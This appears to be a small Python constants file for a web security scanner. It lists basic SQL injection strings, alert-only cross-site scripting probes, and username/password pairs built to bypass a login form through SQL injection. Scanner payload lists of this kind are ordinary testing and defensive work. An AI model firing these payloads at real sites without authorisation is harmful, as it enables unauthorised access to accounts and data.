TIMEOUT = 5

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"a\"=\"a"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>"
]

AUTH_BYPASS_PAYLOADS = [
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "' OR '1'='1", "password": "anything"}
]